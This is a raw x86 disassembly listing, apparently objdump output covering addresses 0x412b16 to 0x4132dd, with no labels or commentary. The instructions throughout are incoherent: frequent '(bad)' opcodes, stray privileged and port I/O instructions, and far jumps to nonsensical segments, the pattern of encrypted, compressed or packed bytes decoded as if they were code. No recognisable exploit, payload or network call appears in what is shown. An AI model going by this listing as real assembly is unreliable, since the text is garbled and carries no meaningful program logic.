  412b16:	call   0xb6a9d2a8
  412b1b:	je     0x412ab5
  412b1d:	inc    edx
  412b1e:	push   esi
  412b1f:	mov    al,0xec
  412b21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b22:	ss xchg edi,eax
  412b24:	cmp    eax,0x3cf0b6f6
  412b29:	sub    al,BYTE PTR [esi-0x35cce3e7]
  412b2f:	(bad)  
  412b30:	bound  edi,QWORD PTR [ebp-0x74]
  412b33:	mov    ss,WORD PTR [ecx]
  412b35:	or     eax,DWORD PTR [ebp-0x3255f97d]
  412b3b:	cmp    eax,0xfc83318d
  412b40:	push   edi
  412b41:	lahf   
  412b42:	(bad)  
  412b43:	mov    al,dl
  412b45:	sahf   
  412b46:	gs in  eax,dx
  412b48:	nop
  412b49:	sbb    BYTE PTR [eax],ah
  412b4b:	xor    BYTE PTR ss:[edx+ebp*4+0x46],dl
  412b50:	mov    eax,0x50203081
  412b55:	sbb    ecx,DWORD PTR [eax+0x13fe624d]
  412b5b:	popa   
  412b5c:	repz cmp cl,BYTE PTR [edx]
  412b5f:	ret    
  412b60:	xor    al,0xea
  412b62:	add    al,0x64
  412b64:	fmul   DWORD PTR [ebp-0x5b]
  412b67:	sbb    BYTE PTR [ebx-0x17edb02e],al
  412b6d:	adc    eax,0xbdf1606c
  412b72:	and    eax,0x749365cd
  412b77:	sar    BYTE PTR [edx],0x7b
  412b7a:	inc    ecx
  412b7b:	sahf   
  412b7c:	xchg   ecx,eax
  412b7d:	mov    DWORD PTR ss:0x8bbcf3d6,ebp
  412b84:	sbb    ah,BYTE PTR [edi-0x7]
  412b87:	jmp    DWORD PTR [edi]
  412b89:	out    0x8b,eax
  412b8b:	cmp    eax,0xf4c03782
  412b90:	aaa    
  412b91:	jge    0x412bd7
  412b93:	stos   BYTE PTR es:[edi],al
  412b94:	sbb    esi,DWORD PTR [ebx]
  412b96:	das    
  412b97:	adc    esp,edi
  412b99:	push   esi
  412b9a:	xor    ecx,DWORD PTR [eax+0xbba306b]
  412ba0:	dec    ecx
  412ba1:	mov    edi,DWORD PTR [ecx+ebx*4+0x24]
  412ba5:	mov    ds:0x5510cd00,al
  412baa:	sub    ebx,edi
  412bac:	dec    edi
  412bad:	inc    ebp
  412bae:	adc    al,0x41
  412bb0:	inc    ecx
  412bb1:	mov    ebp,0xbbe29bee
  412bb6:	mov    BYTE PTR [esi+0x2b2241ae],al
  412bbc:	pop    ebx
  412bbd:	sub    DWORD PTR [ecx-0x7c],ebp
  412bc0:	(bad)  
  412bc1:	xor    BYTE PTR [edi-0x15],dl
  412bc4:	jp     0x412b89
  412bc6:	cli    
  412bc7:	xchg   ebp,eax
  412bc8:	mov    edx,0x716c8fd
  412bcd:	mov    ebx,0x6565a4b9
  412bd2:	loope  0x412bea
  412bd4:	ror    edi,cl
  412bd6:	shl    DWORD PTR [esi+0x48],cl
  412bd9:	ins    DWORD PTR es:[edi],dx
  412bda:	jb     0x412be8
  412bdc:	mov    WORD PTR [ecx+0x5f],?
  412bdf:	sbb    DWORD PTR [edx-0x4f445f8c],edi
  412be5:	cwde   
  412be6:	hlt    
  412be7:	jecxz  0x412c5c
  412be9:	repz sub dl,ch
  412bec:	mov    ds:0x2a3779fd,eax
  412bf1:	jmp    0x412be6
  412bf3:	dec    eax
  412bf4:	test   eax,0x881d81ca
  412bf9:	sbb    edi,eax
  412bfb:	mov    es,WORD PTR [edi-0x7f]
  412bfe:	rcr    edx,1
  412c00:	stos   DWORD PTR es:[edi],eax
  412c01:	js     0x412bae
  412c03:	or     eax,0xf3824db
  412c08:	ret    
  412c09:	ret    0x6fdf
  412c0c:	div    eax
  412c0e:	add    al,0xce
  412c10:	dec    ecx
  412c11:	adc    edx,eax
  412c13:	int3   
  412c14:	ins    BYTE PTR es:[edi],dx
  412c15:	push   0xffffff8a
  412c17:	and    BYTE PTR [ebp-0x2cbd3161],cl
  412c1d:	adc    eax,DWORD PTR [edi+0x1d3e8017]
  412c23:	cmp    BYTE PTR [ecx-0x24],bh
  412c26:	std    
  412c27:	inc    ebx
  412c28:	fwait
  412c29:	sub    eax,0x82bc95a8
  412c2e:	sar    ecx,cl
  412c30:	xchg   edx,eax
  412c31:	inc    ebx
  412c32:	jno    0x412c5b
  412c34:	or     DWORD PTR [edi],ecx
  412c36:	jp     0x412c1f
  412c38:	ret    
  412c39:	adc    dh,BYTE PTR [ebp+esi*1+0x5d]
  412c3d:	jle    0x412c8d
  412c3f:	pop    ecx
  412c40:	popf   
  412c41:	sub    al,0x99
  412c43:	addr16 int 0xd2
  412c46:	mov    ds:0xfbf203fb,eax
  412c4b:	outs   dx,DWORD PTR ds:[esi]
  412c4c:	mov    bl,0xc4
  412c4e:	icebp  
  412c4f:	adc    al,0x11
  412c51:	(bad)  
  412c52:	js     0x412bf3
  412c54:	add    al,BYTE PTR [ebx+0x7]
  412c57:	lods   al,BYTE PTR ds:[esi]
  412c58:	pusha  
  412c59:	jg     0x412be8
  412c5b:	ss (bad) 
  412c5d:	rol    BYTE PTR [edx-0x32],0xda
  412c61:	cmp    BYTE PTR [ebp+0x41b45b96],ch
  412c67:	push   esp
  412c68:	loope  0x412c06
  412c6a:	fimul  DWORD PTR [ebx]
  412c6c:	js     0x412c6f
  412c6e:	int    0x7f
  412c70:	fwait
  412c71:	lahf   
  412c72:	or     DWORD PTR ds:0x567f0051,ecx
  412c78:	dec    edx
  412c79:	inc    ecx
  412c7a:	mov    ecx,0x9f7808a4
  412c7f:	and    DWORD PTR [edx+0x8ce7255],0xffffff93
  412c86:	in     al,dx
  412c87:	dec    ecx
  412c88:	test   BYTE PTR [edx],dh
  412c8a:	push   edx
  412c8b:	xchg   BYTE PTR [esi],bl
  412c8d:	repnz aaa 
  412c8f:	imul   edi,esp,0xffffffa4
  412c92:	mov    ds:0xe80b4322,al
  412c97:	jmp    0x412c77
  412c99:	jg     0x412c6c
  412c9b:	adc    al,0x3e
  412c9d:	imul   edi,edx,0xce032f24
  412ca3:	inc    esp
  412ca4:	jge    0x412cb9
  412ca6:	jmp    0xb40b5b16
  412cab:	gs and al,0x42
  412cae:	and    eax,0x2d59774e
  412cb3:	aad    0x38
  412cb5:	arpl   WORD PTR [edi-0x66],sp
  412cb8:	pop    ecx
  412cb9:	and    bh,BYTE PTR [ebx]
  412cbb:	mov    al,ah
  412cbd:	push   ebp
  412cbe:	(bad)  
  412cbf:	js     0x412ca2
  412cc1:	ret    
  412cc2:	das    
  412cc3:	lock inc ebp
  412cc5:	xchg   ebp,eax
  412cc6:	lods   al,BYTE PTR ds:[esi]
  412cc7:	out    dx,eax
  412cc8:	pop    eax
  412cc9:	out    0x5c,eax
  412ccb:	or     BYTE PTR [esi+0x12],al
  412cce:	jno    0x412cb6
  412cd0:	sahf   
  412cd1:	(bad)  
  412cd2:	mov    ch,0xc
  412cd4:	pop    ecx
  412cd5:	ins    BYTE PTR es:[edi],dx
  412cd6:	fcmove st,st(6)
  412cd8:	cmp    al,0xbc
  412cda:	pop    esi
  412cdb:	mov    cl,0x0
  412cdd:	jno    0x412d59
  412cdf:	and    ah,BYTE PTR [edi]
  412ce1:	shl    DWORD PTR [eax-0x3b],0x2b
  412ce5:	push   ebx
  412ce6:	pop    ss
  412ce7:	jne    0x412cca
  412ce9:	jle    0x412d67
  412ceb:	push   ds
  412cec:	push   0xffffffce
  412cee:	push   ecx
  412cef:	mov    esi,0x7b00a3f1
  412cf4:	inc    DWORD PTR [eax+0x68]
  412cf7:	or     BYTE PTR [esi-0x16fe7814],bl
  412cfd:	adc    BYTE PTR ds:0xdb05d823,bh
  412d03:	adc    BYTE PTR [edi],0x2f
  412d06:	mov    ecx,0xde0aae63
  412d0b:	mov    ebx,0x28d7a31b
  412d10:	sbb    ebx,DWORD PTR [eax-0x62f79ead]
  412d16:	ds stos BYTE PTR es:[edi],al
  412d18:	js     0x412cb5
  412d1a:	jmp    0xadd6:0xc2c516a0
  412d21:	rol    DWORD PTR [edi-0x457ac01],1
  412d27:	loop   0x412d85
  412d29:	jecxz  0x412d28
  412d2b:	fsub   DWORD PTR [eax]
  412d2d:	shr    BYTE PTR [edx],0xbf
  412d30:	sbb    al,0xb0
  412d32:	daa    
  412d33:	scas   eax,DWORD PTR es:[edi]
  412d34:	mov    ds:0xa06fbfeb,al
  412d39:	dec    esi
  412d3a:	rcr    BYTE PTR [edx+0x6d],1
  412d3d:	jmp    0xf80da1ce
  412d42:	pop    ds
  412d43:	xchg   ecx,eax
  412d44:	sub    DWORD PTR [edi+0x6c],ebx
  412d47:	jnp    0x412cfd
  412d49:	inc    ebp
  412d4a:	adc    DWORD PTR [edi+0x6e],0x76
  412d4e:	push   ss
  412d4f:	add    ch,al
  412d51:	out    0x3d,al
  412d53:	or     BYTE PTR [ecx+0x21],ah
  412d56:	outs   dx,BYTE PTR ds:[esi]
  412d57:	sub    eax,0xde52486
  412d5c:	push   esp
  412d5d:	ds pop ecx
  412d5f:	pop    esp
  412d60:	int    0x19
  412d62:	dec    ebp
  412d63:	and    ebp,DWORD PTR [esi]
  412d65:	inc    esp
  412d66:	add    ecx,DWORD PTR [esi+ebp*2-0xf]
  412d6a:	pop    fs
  412d6c:	push   cs
  412d6d:	and    dh,BYTE PTR [edi-0x76ee515e]
  412d73:	cwde   
  412d74:	inc    ebx
  412d75:	mov    ds:0x361a6c36,eax
  412d7a:	pop    edx
  412d7b:	pushf  
  412d7c:	jb     0x412def
  412d7e:	add    edx,edx
  412d80:	cmp    al,0x23
  412d82:	ret    0x9b39
  412d85:	dec    eax
  412d86:	sbb    al,0x2b
  412d88:	lods   eax,DWORD PTR ds:[esi]
  412d89:	push   0x1e
  412d8b:	cli    
  412d8c:	sti    
  412d8d:	(bad)
  412d90:	add    al,0xd5
  412d92:	pop    es
  412d93:	iret   
  412d94:	les    edx,FWORD PTR [eax-0x6c]
  412d97:	pop    edi
  412d98:	cmp    eax,0x131d7336
  412d9d:	cs ret 0xeeab
  412da1:	arpl   WORD PTR [eax],sp
  412da3:	mov    ds:0xa7536873,al
  412da8:	hlt    
  412da9:	pop    ss
  412daa:	popf   
  412dab:	mov    WORD PTR [ebx+ecx*1+0x28],fs
  412daf:	popa   
  412db0:	or     DWORD PTR [esi],ecx
  412db2:	inc    esi
  412db3:	(bad)  
  412db4:	std    
  412db5:	mov    dl,0xaa
  412db7:	test   BYTE PTR [edi-0x104aa453],ah
  412dbd:	jo     0x412de5
  412dbf:	inc    ecx
  412dc0:	jns    0x412d76
  412dc2:	jp     0x412d64
  412dc4:	push   ebx
  412dc5:	es stc 
  412dc7:	retf   0xf046
  412dca:	into   
  412dcb:	enter  0x5c49,0xcf
  412dcf:	rol    DWORD PTR [edi+ecx*8+0x26],1
  412dd3:	push   ecx
  412dd4:	arpl   WORD PTR [ecx+0x31ee2f14],bx
  412dda:	pop    ss
  412ddb:	inc    esi
  412ddc:	(bad)  
  412dde:	add    DWORD PTR [edi+edx*4],eax
  412de1:	and    bl,BYTE PTR [eax]
  412de3:	nop
  412de4:	mov    edx,0xb0dc126e
  412de9:	arpl   WORD PTR [esi+0x21],si
  412dec:	clc    
  412ded:	and    bh,bl
  412def:	cld    
  412df0:	and    ch,cl
  412df2:	sub    eax,0x369ae207
  412df7:	xor    DWORD PTR [edi+0x4a],ecx
  412dfa:	adc    eax,0x4a855a18
  412dff:	lahf   
  412e00:	fstp   DWORD PTR [edi]
  412e02:	lds    esp,FWORD PTR [edx-0x1d]
  412e05:	jp     0x412def
  412e07:	pop    ds
  412e08:	xor    edx,edi
  412e0a:	fsub   st(6),st
  412e0c:	mov    ds:0x35a7da78,al
  412e11:	rcr    DWORD PTR [ebx-0x1],1
  412e14:	outs   dx,BYTE PTR ds:[esi]
  412e15:	jbe    0x412dd1
  412e17:	xor    BYTE PTR [ecx],cl
  412e19:	adc    al,0xdc
  412e1b:	mov    eax,0xc939d905
  412e20:	(bad)  
  412e21:	pop    ds
  412e22:	mov    edx,0x7d0bb624
  412e27:	aas    
  412e28:	aaa    
  412e29:	lods   al,BYTE PTR ds:[esi]
  412e2a:	mov    edi,DWORD PTR [ebx*8-0xd397631]
  412e31:	dec    edx
  412e32:	or     BYTE PTR [esi+0x6ebb48a9],0x4e
  412e39:	lahf   
  412e3a:	rol    BYTE PTR [ebx+eax*1-0x4f6e336d],0xee
  412e42:	pushf  
  412e43:	jl     0x412e6a
  412e45:	xchg   esi,eax
  412e46:	dec    ecx
  412e47:	sbb    BYTE PTR [edi+esi*2],ch
  412e4a:	mov    DWORD PTR [esi],esi
  412e4c:	mov    cl,0x8b
  412e4e:	cli    
  412e4f:	enter  0x242b,0x25
  412e53:	iret   
  412e54:	sbb    esi,0x799a3fa4
  412e5a:	dec    ecx
  412e5b:	fnstcw WORD PTR [eax+0x62]
  412e5e:	add    eax,0xb4302d35
  412e63:	push   ecx
  412e64:	push   ss
  412e65:	xchg   edx,eax
  412e66:	shr    esp,0xa7
  412e69:	xor    BYTE PTR [ecx+0x18b05645],0x13
  412e70:	xlat   BYTE PTR ds:[ebx]
  412e71:	out    0x61,al
  412e73:	loopne 0x412e79
  412e75:	add    al,0x62
  412e77:	mov    bh,0xbb
  412e79:	or     dl,BYTE PTR [edx+ebp*2]
  412e7c:	inc    esi
  412e7d:	push   esp
  412e7e:	mov    ebp,0x161b676a
  412e83:	add    DWORD PTR [edx+0x1ed35313],esp
  412e89:	rcl    esi,1
  412e8b:	in     eax,0x63
  412e8d:	ja     0x412e27
  412e8f:	xchg   edx,eax
  412e90:	xchg   esp,eax
  412e91:	aaa    
  412e92:	ret    0xf250
  412e95:	jae    0x412ec9
  412e97:	shl    DWORD PTR [edi+0x71eba460],0xb0
  412e9e:	mov    bh,0x6f
  412ea0:	dec    eax
  412ea1:	aas    
  412ea2:	fwait
  412ea3:	cmp    al,0x7e
  412ea5:	popa   
  412ea6:	jp     0x412e3e
  412ea8:	adc    ah,0x5
  412eab:	sti    
  412eac:	int3   
  412ead:	bound  ecx,QWORD PTR [ebp-0x19a710f2]
  412eb3:	fstp   DWORD PTR [esi+0x37c69c81]
  412eb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412eba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ebb:	push   esp
  412ebc:	cdq    
  412ebd:	push   edx
  412ebe:	mov    ds:0x1e30ab38,eax
  412ec3:	ror    BYTE PTR [ecx-0x1135f150],cl
  412ec9:	cmp    eax,0x71b6f918
  412ece:	mov    ah,0xb3
  412ed0:	inc    ebx
  412ed1:	test   DWORD PTR [ebx],esp
  412ed3:	clc    
  412ed4:	fs test al,0xe2
  412ed7:	ins    DWORD PTR es:[edi],dx
  412ed8:	pop    esp
  412ed9:	jne    0x412ec3
  412edb:	idiv   BYTE PTR [ecx]
  412edd:	outs   dx,DWORD PTR ds:[esi]
  412ede:	pop    ss
  412edf:	cmp    esp,DWORD PTR [edx-0x250bc9de]
  412ee5:	aam    0x80
  412ee7:	inc    esp
  412ee8:	(bad)  
  412ee9:	cmp    BYTE PTR [esi-0x9d3e0e4],ch
  412eef:	daa    
  412ef0:	xor    ah,BYTE PTR [esi]
  412ef2:	aas    
  412ef3:	cdq    
  412ef4:	mov    al,ds:0xafb6dc21
  412ef9:	pop    edi
  412efa:	je     0x412f1b
  412efc:	int    0x70
  412efe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412eff:	jl     0x412f03
  412f01:	mov    ds:0xcc372273,eax
  412f06:	in     al,0xb7
  412f08:	mov    edx,0xbfe28911
  412f0d:	or     al,0xb5
  412f0f:	lds    esp,FWORD PTR [edi+ebp*2]
  412f12:	retf   0x478d
  412f15:	jmp    0xf27:0xe350b773
  412f1c:	mov    al,ds:0xd5071653
  412f21:	adc    al,dl
  412f23:	cmp    dl,BYTE PTR [ebp+0x3]
  412f26:	push   0xf77bd083
  412f2b:	or     ebx,edi
  412f2d:	mov    edi,0xc9b8cf80
  412f32:	(bad)  
  412f33:	fild   WORD PTR [ecx]
  412f35:	jnp    0x412f93
  412f37:	ret    0x4df6
  412f3a:	inc    esi
  412f3b:	aam    0xbc
  412f3d:	push   cs
  412f3e:	(bad)  
  412f40:	adc    bl,BYTE PTR [edi]
  412f42:	pop    edi
  412f43:	dec    edi
  412f44:	loopne 0x412f8d
  412f46:	cvtps2pd xmm2,QWORD PTR [esi+ecx*8+0x44]
  412f4b:	jne    0x412f08
  412f4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f4e:	add    ecx,DWORD PTR ds:[ebx]
  412f51:	mov    ds:0x5b78f48f,eax
  412f56:	mov    dh,0xf5
  412f58:	enter  0x8907,0x75
  412f5c:	addr16 dec ebp
  412f5e:	stc    
  412f5f:	in     al,dx
  412f60:	and    DWORD PTR [eax],esi
  412f62:	jl     0x412f12
  412f64:	push   edx
  412f65:	aas    
  412f66:	icebp  
  412f67:	mov    al,bl
  412f69:	add    al,0xb5
  412f6b:	mov    edi,DWORD PTR [ebx+esi*2-0x21]
  412f6f:	xchg   DWORD PTR [ebp-0x1b],ecx
  412f72:	pop    eax
  412f73:	mov    cl,0x99
  412f75:	or     ah,dl
  412f77:	inc    edi
  412f78:	push   edi
  412f79:	jno    0x412f7d
  412f7b:	div    esp
  412f7d:	push   ss
  412f7e:	cmc    
  412f7f:	mov    dh,0x97
  412f81:	fisubr DWORD PTR ds:0x4048b868
  412f87:	popf   
  412f88:	or     BYTE PTR [esi+0x13],dl
  412f8b:	imul   edx,DWORD PTR [edx],0xffffffe4
  412f8e:	outs   dx,BYTE PTR ds:[esi]
  412f8f:	jmp    0x408c68dc
  412f94:	(bad)  
  412f95:	sub    eax,0xade86560
  412f9a:	cmp    al,0x26
  412f9c:	dec    ebx
  412f9d:	(bad)  
  412f9e:	icebp  
  412f9f:	mov    WORD PTR [eax-0x19],ss
  412fa2:	xchg   edi,eax
  412fa3:	fsubr  st(5),st
  412fa5:	in     al,dx
  412fa6:	dec    di
  412fa8:	cs ds or eax,0x69272db6
  412faf:	inc    ebp
  412fb0:	mov    al,ds:0xf0cd5f17
  412fb5:	xor    DWORD PTR [edi+0x3988a8c9],esi
  412fbb:	(bad)  
  412fbc:	push   ds
  412fbd:	jp     0x412ff1
  412fbf:	les    ebx,FWORD PTR [edi+0x1c5095d0]
  412fc5:	int3   
  412fc6:	ja     0x413027
  412fc8:	push   esi
  412fc9:	push   eax
  412fca:	pop    ebx
  412fcb:	into   
  412fcc:	xchg   bl,cl
  412fce:	add    dl,BYTE PTR [edx+esi*8+0x560c1f49]
  412fd5:	add    edi,edi
  412fd7:	adc    al,0xa3
  412fd9:	push   ss
  412fda:	cmp    ebp,DWORD PTR [edi-0x70]
  412fdd:	adc    BYTE PTR [ebx+0x48],ah
  412fe0:	fs push ebx
  412fe2:	xor    BYTE PTR [ecx],dl
  412fe4:	mov    bl,0x4a
  412fe6:	ss je  0x413027
  412fe9:	mov    dl,0xe7
  412feb:	cmp    cl,bl
  412fed:	mov    DWORD PTR [esi+ecx*4],esp
  412ff0:	das    
  412ff1:	inc    esi
  412ff2:	or     BYTE PTR ds:0xc17c0c4f,0x9b
  412ff9:	sub    ebp,DWORD PTR [eax+0x7c]
  412ffc:	das    
  412ffd:	xor    ch,BYTE PTR [ecx-0x6c]
  413000:	mov    dh,0xc7
  413002:	push   ecx
  413003:	lahf   
  413004:	push   edx
  413005:	das    
  413006:	mov    dl,BYTE PTR [ecx-0x5bc2eaf6]
  41300c:	sub    al,0xf5
  41300e:	std    
  41300f:	push   esi
  413010:	xor    BYTE PTR [eax-0x6882656d],0xd7
  413017:	inc    esp
  413018:	cmp    ch,BYTE PTR [edx+0x11]
  41301b:	int3   
  41301c:	int    0x9b
  41301e:	out    dx,eax
  41301f:	and    al,0xc2
  413021:	in     al,0x6e
  413023:	dec    esi
  413024:	arpl   WORD PTR [ebx+edi*8+0x4b1c5a36],ax
  41302b:	add    dh,BYTE PTR [ebp+0x24f40b9d]
  413031:	sbb    eax,esi
  413033:	hlt    
  413034:	mov    edi,0x42c976d1
  413039:	xor    bl,0x14
  41303c:	mov    edi,0xcf94222f
  413041:	pop    ss
  413042:	ins    BYTE PTR es:[edi],dx
  413043:	add    DWORD PTR [esp+ebx*1],0x2b22aefc
  41304a:	call   0xb2f0:0x7d79951e
  413051:	xchg   al,ch
  413053:	add    al,0xdd
  413055:	addr16 jo 0x4130a0
  413058:	pop    eax
  413059:	pop    esi
  41305a:	push   edi
  41305b:	inc    ecx
  41305c:	pusha  
  41305d:	shr    BYTE PTR [ebx+0x7a769b60],cl
  413063:	push   ebp
  413064:	aam    0x53
  413066:	(bad)  
  413067:	sub    al,0xdd
  413069:	add    esp,ebx
  41306b:	stc    
  41306c:	inc    ecx
  41306d:	xchg   ebx,eax
  41306e:	(bad)  
  41306f:	div    DWORD PTR [eax]
  413071:	xchg   ecx,eax
  413072:	or     DWORD PTR [esi],eax
  413074:	ret    0x9c4d
  413077:	in     eax,dx
  413078:	add    eax,0x20b2fa00
  41307d:	pushf  
  41307e:	outs   dx,DWORD PTR ds:[esi]
  41307f:	cmp    al,0xfb
  413081:	add    BYTE PTR [esi-0x4b61a772],ah
  413087:	lds    esp,FWORD PTR [edx-0x77]
  41308a:	shl    DWORD PTR [edi+0x636e7ffd],0xc9
  413091:	out    0x78,al
  413093:	mov    fs,WORD PTR [ebx+0x6b]
  413096:	or     esp,DWORD PTR [edi+0xe5eb047]
  41309c:	cdq    
  41309d:	test   al,0x7d
  41309f:	stos   BYTE PTR es:[edi],al
  4130a0:	fcom   DWORD PTR [eax-0x7d0cb477]
  4130a6:	out    dx,eax
  4130a7:	loop   0x413097
  4130a9:	sbb    ah,BYTE PTR [esi+0x6b17f50b]
  4130af:	paddw  mm4,QWORD PTR [esi]
  4130b2:	fimul  WORD PTR [ebp+0x67195d67]
  4130b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4130b9:	retf   0xf448
  4130bc:	cmp    al,0x20
  4130be:	or     DWORD PTR ds:0xde38cb86,0x532a38ed
  4130c8:	jae    0x41309c
  4130ca:	fidivr WORD PTR [eax]
  4130cc:	sbb    dh,BYTE PTR [ebp+edx*1-0x42]
  4130d0:	mov    ch,BYTE PTR [edi]
  4130d2:	(bad)  
  4130d3:	cmc    
  4130d4:	mov    bl,bl
  4130d6:	(bad)  
  4130d7:	jl     0x413084
  4130d9:	test   BYTE PTR [eax-0x311ace88],bh
  4130df:	xchg   ebx,eax
  4130e0:	lahf   
  4130e1:	pop    ds
  4130e2:	push   esp
  4130e3:	jmp    0x8083ec9
  4130e8:	fisubr DWORD PTR [esi+0x72]
  4130eb:	nop
  4130ec:	popf   
  4130ed:	dec    edi
  4130ee:	retf   0x2755
  4130f1:	push   esp
  4130f2:	aaa    
  4130f3:	push   eax
  4130f4:	add    eax,DWORD PTR [edi]
  4130f6:	cmc    
  4130f7:	push   esi
  4130f8:	jg     0x413179
  4130fa:	pop    esp
  4130fb:	pop    ebx
  4130fc:	(bad)  
  4130fd:	ss xchg ebp,eax
  4130ff:	mov    ebx,0xcefffa9e
  413104:	mov    edi,0xf6ba3c7b
  413109:	jp     0x413101
  41310b:	or     eax,0x11d2706c
  413110:	call   0xc0101cc9
  413115:	add    BYTE PTR [ebp-0x51],0x54
  413119:	sahf   
  41311a:	dec    esi
  41311b:	sub    eax,0x11b80a6f
  413120:	addr16 sar al,0x39
  413124:	dec    eax
  413125:	dec    esi
  413126:	pushf  
  413127:	in     al,0x1c
  413129:	and    eax,0x8d14aec
  41312e:	add    BYTE PTR [ebp-0x73],dh
  413131:	push   ecx
  413132:	leave  
  413133:	sbb    ebp,DWORD PTR cs:[eax-0x2a8f68b]
  41313a:	fld    TBYTE PTR [edx]
  41313c:	jl     0x4130e2
  41313e:	scas   eax,DWORD PTR es:[edi]
  41313f:	loopne 0x4131af
  413141:	pop    esp
  413142:	cs xchg esp,eax
  413144:	out    dx,eax
  413145:	sbb    al,0xa3
  413147:	lods   eax,DWORD PTR ds:[esi]
  413148:	add    BYTE PTR [ebx],bh
  41314a:	(bad)  
  41314b:	imul   edx,DWORD PTR [ecx+0x7f7aaae0],0xd8f62600
  413155:	cmp    edx,DWORD PTR [ecx]
  413157:	loop   0x413114
  413159:	mov    WORD PTR [eax-0x1c0a4e83],?
  41315f:	popf   
  413160:	out    dx,al
  413161:	mov    eax,ds:0x8e973d24
  413166:	mov    edi,0xc76728a0
  41316b:	and    al,0x9b
  41316d:	xor    bl,BYTE PTR [ebx]
  41316f:	fxch   st(1)
  413171:	jb     0x41316a
  413173:	shl    DWORD PTR [edi+0x2e102373],0x29
  41317a:	cwde   
  41317b:	push   si
  41317d:	ins    DWORD PTR es:[edi],dx
  41317e:	(bad)  
  41317f:	push   edi
  413180:	mov    al,0xe6
  413182:	fild   DWORD PTR [esi-0x2]
  413185:	cmp    DWORD PTR ds:0xaab12bcb,0x36
  41318c:	add    ecx,ebp
  41318e:	jmp    0x41311d
  413190:	add    BYTE PTR [ebx-0x2f],ah
  413193:	xor    dh,BYTE PTR [edx-0x7c8fda71]
  413199:	gs aaa 
  41319b:	(bad)  
  41319d:	jns    0x413150
  41319f:	cld    
  4131a0:	mov    WORD PTR [ebx+0x55686ef7],?
  4131a6:	jno    0x41319f
  4131a8:	xlat   BYTE PTR ds:[ebx]
  4131a9:	bound  eax,QWORD PTR [edx]
  4131ab:	adc    BYTE PTR ds:0x977e8a0b,dh
  4131b1:	pusha  
  4131b2:	sub    al,0xc9
  4131b4:	imul   edi,DWORD PTR [eax+ebx*1-0x5a5deb60],0xf29ee18c
  4131bf:	loop   0x4131be
  4131c1:	mov    ch,0x8
  4131c3:	repnz sub dh,dl
  4131c6:	pusha  
  4131c7:	test   BYTE PTR [esp+eiz*2+0xf],0x38
  4131cc:	in     eax,dx
  4131cd:	and    dl,dh
  4131cf:	mov    dl,BYTE PTR [ebx+0x62]
  4131d2:	shr    DWORD PTR [esi+edx*1],cl
  4131d5:	iret   
  4131d6:	sub    al,BYTE PTR ds:0xc2cbc92c
  4131dc:	lahf   
  4131dd:	and    al,0x6b
  4131df:	int    0xa4
  4131e1:	sbb    al,0x95
  4131e3:	rcr    BYTE PTR [eax-0x64],cl
  4131e6:	mov    ecx,gs
  4131e8:	pop    esi
  4131e9:	mov    al,ds:0xc060d103
  4131ee:	xchg   edx,eax
  4131ef:	xlat   BYTE PTR cs:[ebx]
  4131f1:	icebp  
  4131f2:	mov    eax,ds:0xeb9368b2
  4131f7:	lahf   
  4131f8:	sub    eax,0xddbac42e
  4131fd:	in     al,dx
  4131fe:	sbb    dh,bl
  413200:	je     0x4131eb
  413202:	add    al,0xa9
  413204:	and    eax,0xd4d2ad5
  413209:	sbb    al,0xbc
  41320b:	xchg   BYTE PTR [edx+edi*8+0x7929af0c],cl
  413212:	sub    BYTE PTR [eax+eax*4+0x7e30585],bh
  413219:	adc    al,0x2b
  41321b:	mov    bl,0xcb
  41321d:	mov    eax,0x54f1445e
  413222:	ret    0x7d9f
  413225:	test   eax,0x194a729a
  41322a:	and    al,0x8a
  41322c:	push   ebp
  41322d:	xchg   DWORD PTR [eax-0x27],edx
  413230:	cmp    DWORD PTR ds:0x13ee8378,esp
  413236:	loopne 0x41328e
  413238:	mov    edx,0xf962e736
  41323d:	dec    eax
  41323e:	addr16 test al,0x1
  413241:	lahf   
  413242:	test   eax,0x45734c4b
  413247:	mov    ds:0xbae0bb0f,ax
  41324d:	leave  
  41324e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41324f:	mov    al,ds:0x60306684
  413254:	push   ecx
  413255:	in     al,0xe1
  413257:	xchg   edx,eax
  413258:	shl    BYTE PTR [eax-0x782686bc],1
  41325e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41325f:	jge    0x413259
  413261:	mov    bh,0xee
  413263:	sahf   
  413264:	pusha  
  413265:	clc    
  413266:	or     ecx,edi
  413268:	and    al,0x70
  41326a:	sub    DWORD PTR [edx+0xa],edi
  41326d:	sbb    al,0x33
  41326f:	fistp  QWORD PTR [ebx]
  413271:	scas   al,BYTE PTR es:[edi]
  413272:	jne    0x413267
  413274:	inc    ebp
  413275:	mov    ecx,0x4a056173
  41327a:	out    0x2f,eax
  41327c:	pop    ecx
  41327d:	mov    cl,0xff
  41327f:	out    dx,eax
  413280:	and    al,0x5b
  413282:	icebp  
  413283:	mov    ebx,0x4c2c13fa
  413288:	test   al,0xa1
  41328a:	out    0x4a,eax
  41328c:	sub    BYTE PTR [ebx-0x53c2ce1c],0x97
  413293:	mov    eax,0x42dfd507
  413298:	cmc    
  413299:	outs   dx,BYTE PTR ds:[esi]
  41329a:	inc    esp
  41329b:	ret    0x60bf
  41329e:	sub    BYTE PTR [edi+0x2fd4717e],0xb1
  4132a5:	mov    WORD PTR [esi+ebx*4],gs
  4132a8:	pushf  
  4132a9:	jp     0x4132fd
  4132ab:	mov    ebp,0x96198d48
  4132b0:	and    eax,0xff483645
  4132b5:	push   esi
  4132b6:	aam    0x96
  4132b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4132b9:	(bad)  
  4132ba:	leave  
  4132bb:	push   eax
  4132bc:	loopne 0x4132d7
  4132be:	je     0x41331c
  4132c0:	ret    0x716c
  4132c3:	xchg   esp,eax
  4132c4:	outs   dx,DWORD PTR ds:[esi]
  4132c5:	jmp    0xdec6:0x748b34fa
  4132cc:	mov    cl,0xad
  4132ce:	cmp    esi,esi
  4132d0:	cli    
  4132d1:	ins    BYTE PTR es:[edi],dx
  4132d2:	sbb    BYTE PTR [ebx+0xf3e4a66],dl
  4132d8:	mov    dl,0x8b
  4132da:	mov    ch,0x50
  4132dc:	popa   
  4132dd:	(bad)  
